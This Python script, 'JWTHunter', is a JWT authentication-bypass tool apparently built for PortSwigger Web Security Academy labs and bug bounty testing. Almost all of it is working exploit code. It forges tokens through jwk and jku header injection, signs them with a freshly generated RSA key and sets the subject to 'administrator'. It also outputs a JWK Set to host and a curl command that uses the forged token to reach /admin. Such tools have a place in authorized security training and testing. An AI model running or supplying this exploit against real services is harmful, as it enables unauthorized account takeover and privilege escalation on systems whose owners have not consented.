#!/usr/bin/env python3
# JWTHunter - JWT Vulnerability Testing Tool for Bug Bounty Programs
# For educational and authorized testing purposes only

import argparse
import base64
import json
import os
import sys
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization, hashes

def generate_keypair():
    """Generate an RSA key pair"""
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
        backend=default_backend()
    )
    public_key = private_key.public_key()
    
    return private_key, public_key

def int_to_base64(value):
    """Convert an integer to a base64url encoded string"""
    value_hex = format(value, 'x')
    if len(value_hex) % 2 == 1:
        value_hex = '0' + value_hex
    value_bytes = bytes.fromhex(value_hex)
    return base64.urlsafe_b64encode(value_bytes).rstrip(b'=').decode('utf-8')

def public_key_to_jwk(public_key, kid="exploitkey"):
    """Convert a public key to a JWK - minimal format for PortSwigger labs"""
    public_numbers = public_key.public_numbers()
    
    # Minimal format for PortSwigger compatibility
    jwk = {
        "kty": "RSA",
        "kid": kid,
        "e": int_to_base64(public_numbers.e),
        "n": int_to_base64(public_numbers.n)
    }
    
    return jwk

def parse_jwt(jwt_token):
    """Parse a JWT token into its components"""
    parts = jwt_token.split('.')
    if len(parts) != 3:
        raise ValueError("Invalid JWT token")
    
    header_b64, payload_b64, signature_b64 = parts
    
    # Parse header
    header = decode_base64_segment(header_b64)
    
    # Parse payload
    payload = decode_base64_segment(payload_b64)
    
    return header, payload, header_b64, payload_b64, signature_b64

def decode_base64_segment(b64_str):
    """Decode a base64url encoded segment of a JWT"""
    # Pad the base64 encoded string if necessary
    padding_needed = len(b64_str) % 4
    if padding_needed:
        b64_str += '=' * (4 - padding_needed)
    
    # Replace URL-safe characters
    b64_str = b64_str.replace('-', '+').replace('_', '/')
    
    try:
        decoded = base64.b64decode(b64_str)
        return json.loads(decoded.decode('utf-8'))
    except Exception as e:
        raise ValueError(f"Error decoding base64 segment: {e}")

def base64url_encode(data):
    """Base64url encode the given data"""
    if isinstance(data, str):
        data = data.encode('utf-8')
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('utf-8')

def sign_jwt(header_dict, payload_dict, private_key):
    """Create a new JWT with the given header and payload, signed with the private key"""
    # Encode header and payload
    header_encoded = base64url_encode(json.dumps(header_dict))
    payload_encoded = base64url_encode(json.dumps(payload_dict))
    
    # Create the message to sign
    message = f"{header_encoded}.{payload_encoded}".encode('utf-8')
    
    # Sign the message
    signature = private_key.sign(
        message,
        padding.PKCS1v15(),
        hashes.SHA256()
    )
    
    # Encode the signature
    signature_encoded = base64url_encode(signature)
    
    # Return the complete JWT
    return f"{header_encoded}.{payload_encoded}.{signature_encoded}"

def exploit_jku(jwt_token, jku_url, payload=None, kid=None):
    """Exploit using jku header injection - optimized for PortSwigger labs"""
    # Parse the JWT
    header, orig_payload, _, _, _ = parse_jwt(jwt_token)
    
    print("\nDebug Info - Original Token:")
    print(f"Header: {json.dumps(header, indent=2)}")
    print(f"Payload: {json.dumps(orig_payload, indent=2)}")
    
    # Generate a key pair
    private_key, public_key = generate_keypair()
    
    # Use provided kid or the kid from the JWT if it exists, otherwise use default
    key_id = kid or header.get('kid', 'exploitkey')
    
    # Create the JWK with minimal format
    jwk = public_key_to_jwk(public_key, key_id)
    
    # Create the JWK Set
    jwk_set = {
        "keys": [jwk]
    }
    
    # Keep all original header fields to ensure compatibility
    new_header = header.copy()
    
    # Add/modify the specific fields we need to
    new_header['jku'] = jku_url
    new_header['alg'] = 'RS256'
    new_header['kid'] = key_id
    
    # Use custom payload if provided, otherwise use the original
    final_payload = payload.copy() if payload else orig_payload.copy()
    
    # Explicitly set sub to administrator for PortSwigger labs
    final_payload['sub'] = 'administrator'
    
    print("\nDebug Info - Modified Token:")
    print(f"Header: {json.dumps(new_header, indent=2)}")
    print(f"Payload: {json.dumps(final_payload, indent=2)}")
    
    # Create and sign the new token
    new_token = sign_jwt(new_header, final_payload, private_key)
    
    return {
        'method': 'jku',
        'jwk_set': jwk_set,
        'new_token': new_token,
        'private_key': private_key
    }

def exploit_jwk(jwt_token, payload=None, kid=None):
    """Exploit using jwk header injection - optimized for PortSwigger labs"""
    # Parse the JWT
    header, orig_payload, _, _, _ = parse_jwt(jwt_token)
    
    print("\nDebug Info - Original Token:")
    print(f"Header: {json.dumps(header, indent=2)}")
    print(f"Payload: {json.dumps(orig_payload, indent=2)}")
    
    # Generate a key pair
    private_key, public_key = generate_keypair()
    
    # Use provided kid or the kid from the JWT if it exists, otherwise use default
    key_id = kid or header.get('kid', 'exploitkey')
    
    # Create the JWK with minimal format
    jwk = public_key_to_jwk(public_key, key_id)
    
    # Keep all original header fields to ensure compatibility
    new_header = header.copy()
    
    # Add/modify the specific fields we need to
    new_header['jwk'] = jwk
    new_header['alg'] = 'RS256'
    new_header['kid'] = key_id
    
    # Use custom payload if provided, otherwise use the original
    final_payload = payload.copy() if payload else orig_payload.copy()
    
    # Explicitly set sub to administrator for PortSwigger labs
    final_payload['sub'] = 'administrator'
    
    print("\nDebug Info - Modified Token:")
    print(f"Header: {json.dumps(new_header, indent=2)}")
    print(f"Payload: {json.dumps(final_payload, indent=2)}")
    
    # Create and sign the new token
    new_token = sign_jwt(new_header, final_payload, private_key)
    
    return {
        'method': 'jwk',
        'jwk': jwk,
        'new_token': new_token,
        'private_key': private_key
    }

def save_private_key(private_key, filename='private_key.pem'):
    """Save the private key to a PEM file"""
    pem = private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption()
    )
    
    with open(filename, 'wb') as f:
        f.write(pem)
    
    return filename

def main():
    parser = argparse.ArgumentParser(description='JWT Authentication Bypass Tool for Bug Bounty Testing')
    parser.add_argument('--jwt', required=True, help='JWT token to exploit')
    parser.add_argument('--method', required=True, choices=['jwk', 'jku'], help='Exploit method (jwk or jku)')
    parser.add_argument('--payload', help='Custom payload as JSON string')
    parser.add_argument('--jku-url', help='URL to host JWK Set (required for jku method)')
    parser.add_argument('--output', default='jwk_set.json', help='Output file for JWK Set (default: jwk_set.json)')
    parser.add_argument('--kid', help='Override the kid value (default: extracted from JWT or "exploitkey")')
    parser.add_argument('--portswigger', action='store_true', help='PortSwigger lab mode (automatically sets sub to administrator)')
    
    args = parser.parse_args()
    
    try:
        # Parse custom payload if provided
        custom_payload = None
        if args.payload:
            try:
                custom_payload = json.loads(args.payload)
            except json.JSONDecodeError:
                print("Error: Invalid JSON payload")
                sys.exit(1)
        
        # Execute the selected exploit method
        if args.method == 'jku':
            if not args.jku_url:
                print("Error: --jku-url is required for jku method")
                sys.exit(1)
                
            result = exploit_jku(args.jwt, args.jku_url, custom_payload, args.kid)
            
            # Save JWK Set to file
            with open(args.output, 'w') as f:
                json.dump(result['jwk_set'], f, indent=4)
            print(f"JWK Set saved to {args.output}")
            
            # For JKU method, only output the JWK Set in {"keys": [...]} format
            print("\nJWK Set JSON (host this at your URL):")
            print(json.dumps(result['jwk_set'], indent=4))
            
            print("\nExploitation steps (jku method):")
            print(f"1. Host the JWK Set JSON at: {args.jku_url}")
            print("2. Use the modified JWT token in your requests")
            
            if args.portswigger:
                print("\nPortSwigger Lab Specific Instructions:")
                print("1. Go to Exploit Server in the lab")
                print("2. Set the File name to 'exploit.json'")
                print("3. In the 'Body' section, paste the JWK Set JSON above")
                print("4. Make sure Content-Type is set to 'application/json'")
                print("5. Click 'Store' and then 'View exploit'")
                print("6. Verify that you can see the JSON content in your browser")
                print("7. Your JKU URL should be: https://your-exploit-server-id.web-security-academy.net/exploit.json")
                print("8. Use the modified token below to access /admin")
            
        elif args.method == 'jwk':
            result = exploit_jwk(args.jwt, custom_payload, args.kid)
            
            # For JWK method, output the full result
            output = {
                'method': 'jwk',
                'new_token': result['new_token'],
                'jwk': result['jwk']
            }
            
            print("\nExploitation steps (jwk method):")
            print("1. Use the modified JWT token directly in your requests")
            
            if args.portswigger:
                print("\nPortSwigger Lab Specific Instructions:")
                print("1. The token below is already modified with the jwk header")
                print("2. Use it to access /admin in the lab")
            
            print("\nJSON output:")
            print(json.dumps(output, indent=4))
        
        # Save the private key
        private_key_file = save_private_key(result['private_key'])
        print(f"\nPrivate key saved to {private_key_file}")
        
        # Print the modified JWT token regardless of method
        print("\nModified JWT token:")
        print(result['new_token'])
        
        # Show how to use with curl for both methods
        print("\nTest with curl:")
        print(f"curl -i -k -X GET \"https://your-lab-id.web-security-academy.net/admin\" -H \"Cookie: session={result['new_token']}\"")
        
    except Exception as e:
        print(f"Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
